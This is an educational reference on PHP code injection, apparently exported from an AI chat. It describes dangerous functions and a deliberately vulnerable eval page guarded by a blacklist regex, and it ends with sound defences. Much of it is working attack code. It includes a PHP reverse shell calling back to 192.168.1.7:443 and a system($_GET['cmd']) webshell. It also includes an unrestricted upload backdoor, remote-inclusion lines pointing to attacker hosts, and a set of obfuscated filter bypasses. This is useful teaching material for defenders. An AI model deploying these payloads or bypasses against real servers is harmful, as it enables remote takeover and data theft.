# 🛡️ PHP Code Injection - Educational Security Reference

> **⚠️ DISCLAIMER:** This document is for educational and defensive security purposes only. Understanding these vulnerabilities helps security professionals protect systems. Never use this information for unauthorized access or malicious activities.

---

## 📋 Table of Contents

1. [Overview](https://claude.ai/chat/79c74679-16fc-4bff-bc82-0c8308138df2#overview)
2. [Dangerous PHP Functions](https://claude.ai/chat/79c74679-16fc-4bff-bc82-0c8308138df2#dangerous-php-functions)
3. [Attack Payloads](https://claude.ai/chat/79c74679-16fc-4bff-bc82-0c8308138df2#attack-payloads)
4. [Flawed Mitigation Example](https://claude.ai/chat/79c74679-16fc-4bff-bc82-0c8308138df2#flawed-mitigation-example)
5. [Proper Security Measures](https://claude.ai/chat/79c74679-16fc-4bff-bc82-0c8308138df2#proper-security-measures)

---

## 🎯 Overview

### What is Code Injection?

Code injection occurs when an attacker can insert and execute arbitrary code in an application. In PHP applications, this is particularly dangerous as it can lead to:

- **Remote Code Execution (RCE)**
- **Data Breaches**
- **System Compromise**
- **Complete Server Takeover**

### Common Scenario

The educational example shows a **flawed mitigation attempt** that uses blacklisting to prevent code injection. This approach is fundamentally insecure because:

✗ Blacklists can be bypassed  
✗ New dangerous functions may not be blocked  
✗ `eval()` should never be used with user input  
✗ Defensive programming requires whitelisting, not blacklisting

---

## ⚠️ Dangerous PHP Functions

### 1. `escapeshellcmd()`

php

```php
$safe_input = escapeshellcmd($user_input);
```

**Purpose:** Sanitizes command strings to escape shell metacharacters

**Use Case:** When executing shell commands via `exec()` or `shell_exec()`

**⚠️ Risk:**

- Alone, it may not fully prevent injection
- Must be combined with strict input validation
- Original command logic must be secure

**Security Level:** 🟡 Partial Protection

---

### 2. `include` / `require`

php

```php
include('/etc/passwd');
include('http://192.168.1.7/php-reverse-shell.php');
require('/etc/passwd');
require('http://192.168.1.7/php-reverse-shell.php');
```

**Purpose:** Include and execute external PHP files

**⚠️ Risks:**

- **Local File Inclusion (LFI):** Read sensitive system files
- **Remote File Inclusion (RFI):** Execute attacker-controlled code

**Attack Examples:**

|Attack Type|Code|Impact|
|---|---|---|
|LFI|`include('/etc/passwd')`|Attempts to include system password file, causing errors or information leakage|
|RFI|`include('http://attacker.com/shell.php')`|Executes remote malicious code from attacker's server|

**Security Level:** 🔴 Critical Risk

---

### 3. `file_put_contents()`

php

```php
$code = '<?php phpinfo(); ?>';
file_put_contents("phpinfo-test.php", $code);
```

**Purpose:** Write data to a file (creates or overwrites)

**⚠️ Risk:**

- Write malicious PHP backdoors
- Create webshells for persistent access
- Overwrite critical system files
- Deploy information disclosure scripts

**Attack Example:**

php

```php
$backdoor = '<?php system($_GET["cmd"]); ?>';
file_put_contents("backdoor.php", $backdoor);
// Attacker can now execute: backdoor.php?cmd=whoami
```

**Impact:** Creates a file that reveals complete PHP configuration when accessed

**Security Level:** 🔴 High Risk

---

### 4. `file_get_contents()`

php

```php
$content = file_get_contents("/etc/passwd");
echo nl2br(htmlspecialchars($content));
```

**Purpose:** Read file or URL contents into a string

**⚠️ Risk:**

- Read sensitive system files
- Fetch remote malicious content
- Information disclosure
- Server-Side Request Forgery (SSRF)

**Attack Scenarios:**

|Scenario|Code|Result|
|---|---|---|
|Local File Read|`file_get_contents('/etc/passwd')`|Exposes system user information|
|Remote Fetch|`file_get_contents('http://attacker.com/payload')`|Retrieves attacker-controlled content|
|SSRF|`file_get_contents('http://internal-server/admin')`|Access internal resources|

**Security Level:** 🔴 High Risk

---

### 5. `eval()` ⚡ MOST DANGEROUS

php

```php
$code = 'echo "Hello, World!";';
eval($code);
```

**Purpose:** Evaluate and execute PHP code from a string at runtime

**⚠️ Critical Risks:**

- **Remote Code Execution (RCE)** - The ultimate security vulnerability
- Executes arbitrary PHP code
- No inherent security boundaries
- Complete system compromise possible

**Why It's Dangerous:**

php

```php
// Attacker input: system('rm -rf /');
$user_input = $_POST['code'];
eval($user_input); // NEVER DO THIS!
```

**Security Principle:** 🚫 **NEVER use `eval()` with user input under ANY circumstances**

**Security Level:** 🔴🔴🔴 CRITICAL - NEVER USE WITH USER INPUT

---

## 💣 Attack Payloads

### Reverse Shell Payload

php

```php
$ip = '192.168.1.7';
$port = 443;
$code = '<?php 
    set_time_limit(0); 
    $sock = fsockopen(\'' . $ip . '\', ' . $port . '); 
    $proc = proc_open(\'/bin/sh\', 
        array(0=>$sock, 1=>$sock, 2=>$sock), 
        $pipes
    ); 
?>';
file_put_contents("reverse-shell.php", $code);
```

**What It Does:**

1. Opens TCP connection back to attacker (192.168.1.7:443)
2. Spawns `/bin/sh` shell over the connection
3. Redirects input/output/error to the socket
4. Gives attacker remote command execution

**Attack Flow:**

```
[Vulnerable Server] --TCP--> [Attacker's Machine]
                             (listening on port 443)
                    <--Shell Commands--
                    --Command Output-->
```

**Impact:** Complete remote control of the compromised server

---

### File Upload Backdoor

php

```php
$file = fopen("upload2.php", "w");
fwrite($file, '<html>
<form action="upload2.php" method="post" enctype="multipart/form-data">
    Select File to upload:
    <input type="file" name="fileToUpload" id="fileToUpload">
    <input type="submit" value="Upload" name="submit">
</form>
</html>
<?php 
if(isset($_POST["submit"])) {
    $file_name = $_FILES["fileToUpload"]["name"];
    $file_tmp_name = $_FILES["fileToUpload"]["tmp_name"];
    if (move_uploaded_file($file_tmp_name, "./" . $file_name)) {
        echo "ok";
    }
}
?>');
fclose($file);
```

**What It Does:**

1. Creates an HTML form for file uploads
2. No file type validation
3. No file size restrictions
4. No security checks whatsoever

**⚠️ Risk:** Allows arbitrary file upload including:

- PHP webshells
- Malicious executables
- Overwrite existing files
- Execute uploaded PHP scripts

**Attack Scenario:**

1. Attacker uploads `malicious.php`
2. File is saved to web-accessible directory
3. Attacker accesses `http://target.com/malicious.php`
4. Malicious code executes with web server privileges

---

### Combined Function Attack: `fsockopen`, `proc_open`, `file_put_contents`

php

```php
$ip = '192.168.1.7';
$port = 443;
$reverse_shell = '<?php 
    set_time_limit(0);
    $sock = fsockopen(\'' . $ip . '\', ' . $port . ');
    $proc = proc_open(\'/bin/sh\', 
        array(0=>$sock, 1=>$sock, 2=>$sock),
        $pipes
    );
?>';
file_put_contents("reverse-shell.php", $reverse_shell);
```

**Functions Used:**

- `fsockopen()` - Opens network socket connection
- `proc_open()` - Executes a program (shell)
- `file_put_contents()` - Writes the payload to disk

**Attack Chain:**

1. Write malicious PHP file to server
2. Access the file via HTTP
3. Script opens connection to attacker
4. Shell spawned over the connection
5. Attacker has full command-line access

---

## 📊 Vulnerability Summary Table

|Function/Payload|Description|Risk Level|Attack Type|
|---|---|---|---|
|`escapeshellcmd`|Sanitizes shell commands (partial protection)|🟡 Medium|Command Injection|
|`include`, `require`|Includes PHP files|🔴 Critical|LFI/RFI|
|`file_put_contents`|Writes data to files|🔴 High|Backdoor Creation|
|`file_get_contents`|Reads file/URL contents|🔴 High|Info Disclosure|
|`eval`|Executes arbitrary PHP code|🔴🔴🔴 CRITICAL|RCE|
|`include('/etc/passwd')`|Local file inclusion attempt|🔴 High|LFI|
|`include('http://...')`|Remote file inclusion|🔴 Critical|RFI|
|`require('/etc/passwd')`|Same as include (local)|🔴 High|LFI|
|`require('http://...')`|Remote file inclusion|🔴 Critical|RFI|
|Reverse Shell Payload|Opens remote shell connection|🔴🔴🔴 CRITICAL|Remote Access|
|File Upload Handler|Enables unvalidated uploads|🔴 High|Malware Upload|
|`fsockopen` + `proc_open`|Creates backdoor connection|🔴🔴🔴 CRITICAL|Remote Shell|

## 🚨 Flawed Mitigation Example

### ❌ INSECURE CODE (Educational Example)

html

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Code Injection</title>
</head>
<body>

<form action="code-injection-8.php" method="POST">
    Function: <input type="text" name="fun"><br />
    <input type="submit" name="run" value="run">
</form>

<pre>
<?php
if (isset($_POST['fun'])) {
    $fun = $_POST['fun'];
    
    // ❌ FLAWED APPROACH: Blacklist filtering
    // Check if input contains dangerous function names
    if (!preg_match('/exec|system|shell_exec|include|require|passthru|escapeshellcmd|file_put_contents|fsockopen|proc_open|fopen|fwrite|file_get_contents|popen/i', $fun)) {
        
        // ❌ CRITICAL VULNERABILITY: eval() with user input
        eval($fun . ';');
        
    } else {
        // Block execution and display error
        echo "Error";
    }
}
?>
</pre>

</body>
</html>
```

# bypass payloads-
---

## 📄 Screenshot 1 — Obfuscated Function Execution

`$func = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109); $func("REDACTED_COMMAND"); 
$fun = "sy" . "stem"; $fun("REDACTED_COMMAND");  
call_user_func(     base64_decode('REDACTED'),     "REDACTED_COMMAND" );  register_shutdown_function(     base64_decode('REDACTED'),     base64_decode('REDACTED') );  
array_reduce(     [],     base64_decode('REDACTED'),     base64_decode('REDACTED') );  forward_static_call_array(     base64_decode('REDACTED'),     [ base64_decode('REDACTED') ] );`

### 🔍 What This Demonstrates

- Obfuscation using:
    
    - `chr()`
        
    - `base64_decode()`
        
    - `call_user_func()`
        
- Multiple execution paths
    
- Hard-to-detect malicious logic
    

---

## 📄 Screenshot 2 — Command Execution Patterns

`$a = "sys"; $b = "tem"; $f = $a . $b;  $f("REDACTED");  $ip = implode('.', [192, 168, 1, 7]); $f("REDACTED");`

### ⚠️ Risk

- Function name built dynamically
    
- IP constructed to evade filters
    
- Executes OS-level commands
    

---

## 📄 Screenshot 3 — File & System Access

`readfile('/etc/passwd');  highlight_file(phpinfo());  show_source('/etc/passwd');  show_source('phpinfo-test.php');  getenv(); ini_get_all(); getcwd();`
### 🔍 Why This Fails

| Issue                 | Explanation                                                     |
| --------------------- | --------------------------------------------------------------- |
| **Blacklisting**      | Impossible to enumerate all dangerous functions                 |
| **Bypass Techniques** | Functions can be called indirectly (e.g., variable functions)   |
| **New Functions**     | New dangerous functions won't be blocked                        |
| **eval() Usage**      | Using `eval()` with ANY user input is fundamentally insecure    |
| **Regex Limitations** | Can be bypassed with encoding, concatenation, or indirect calls |

### 🎭 Example Bypasses

Even with this blacklist, an attacker could:

php

```php
// Bypass 1: Variable functions
$_GET['f']($_GET['c']);
// Access as: ?f=system&c=whoami

// Bypass 2: String concatenation
$a = 'sys' . 'tem';
$a('whoami');

// Bypass 3: Using backticks (shell execution)
`whoami`;

// Bypass 4: Using assert (older PHP)
assert($_GET['cmd']);

// Bypass 5: Indirect function calls
call_user_func('system', 'whoami');
```

---

## ✅ Proper Security Measures

### 🛡️ Defense-in-Depth Approach

#### 1. **NEVER Use `eval()` with User Input**

php

```php
// ❌ NEVER DO THIS
eval($_POST['code']);

// ✅ INSTEAD: Use whitelisted operations
$allowed_operations = [
    'add' => fn($a, $b) => $a + $b,
    'multiply' => fn($a, $b) => $a * $b,
];

if (isset($allowed_operations[$_POST['operation']])) {
    $result = $allowed_operations[$_POST['operation']]($a, $b);
}
```

#### 2. **Input Validation (Whitelist Approach)**

php

```php
// ✅ Whitelist allowed values
$allowed_actions = ['view', 'edit', 'delete'];
$action = $_POST['action'];

if (in_array($action, $allowed_actions, true)) {
    // Process action
} else {
    // Reject
    die('Invalid action');
}
```

#### 3. **Parameterized Queries for Databases**

php

```php
// ❌ SQL Injection vulnerable
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];

// ✅ Prepared statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);
```

#### 4. **Secure File Operations**

php

```php
// ❌ Dangerous
include($_GET['page'] . '.php');

// ✅ Whitelist files
$allowed_pages = ['home', 'about', 'contact'];
$page = $_GET['page'];

if (in_array($page, $allowed_pages, true)) {
    include($page . '.php');
}
```

#### 5. **Disable Dangerous PHP Functions**

In `php.ini`:

ini

```ini
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
```

#### 6. **Implement Proper Access Controls**

php

```php
// Verify user permissions
if (!$user->hasPermission('admin')) {
    http_response_code(403);
    die('Access denied');
}
```

#### 7. **Use Security Headers**

php

```php
header("Content-Security-Policy: default-src 'self'");
header("X-Frame-Options: DENY");
header("X-Content-Type-Options: nosniff");
```

#### 8. **Regular Security Audits**

- Code reviews
- Penetration testing
- Static analysis tools (PHPStan, Psalm)
- Dynamic analysis (OWASP ZAP, Burp Suite)

---

## 🎓 Key Takeaways

### For Security Professionals

1. **Understanding vulnerabilities** is the first step in defense
2. **Never trust user input** - validate, sanitize, and verify everything
3. **Use whitelisting** instead of blacklisting
4. **Defense-in-depth** - multiple layers of security
5. **Keep systems updated** - patch vulnerabilities promptly

### Red Flags in Code

🚩 Use of `eval()` with variables  
🚩 Dynamic `include`/`require` statements  
🚩 User input in shell commands  
🚩 No input validation  
🚩 Blacklist-based filtering  
🚩 File operations with user-controlled paths

---

## 📚 Additional Resources

### Recommended Reading

- OWASP Top 10: [https://owasp.org/www-project-top-ten/](https://owasp.org/www-project-top-ten/)
- PHP Security Guide: [https://phpsecurity.readthedocs.io/](https://phpsecurity.readthedocs.io/)
- CWE-94 (Code Injection): [https://cwe.mitre.org/data/definitions/94.html](https://cwe.mitre.org/data/definitions/94.html)
- OWASP Code Injection: [https://owasp.org/www-community/attacks/Code_Injection](https://owasp.org/www-community/attacks/Code_Injection)

### Security Testing Tools

- **Static Analysis:** PHPStan, Psalm, SonarQube
- **Dynamic Testing:** OWASP ZAP, Burp Suite
- **Penetration Testing:** Metasploit, SQLMap
- **Code Review:** SonarCloud, CodeQL

---

## ⚖️ Legal and Ethical Notice

**This document is provided strictly for educational purposes.**

✅ **Authorized Use:**

- Learning security concepts
- Defensive security training
- Authorized penetration testing
- Security research with permission

❌ **Unauthorized Use:**

- Attacking systems without permission
- Exploiting vulnerabilities maliciously
- Unauthorized access to systems
- Any illegal activities

**Remember:** Unauthorized access to computer systems is illegal in most jurisdictions and can result in severe criminal penalties.

---

## 🔐 Conclusion

Understanding these vulnerabilities empowers security professionals to:

1. **Identify weaknesses** in code during reviews
2. **Implement proper defenses** in applications
3. **Test security controls** effectively
4. **Educate developers** on secure coding practices

**Security is everyone's responsibility.** By understanding attack vectors, we can build more resilient and secure systems.

---

_Document Version: 1.0_  
_Last Updated: December 2025_  
_Purpose: Educational and Defensive Security Training_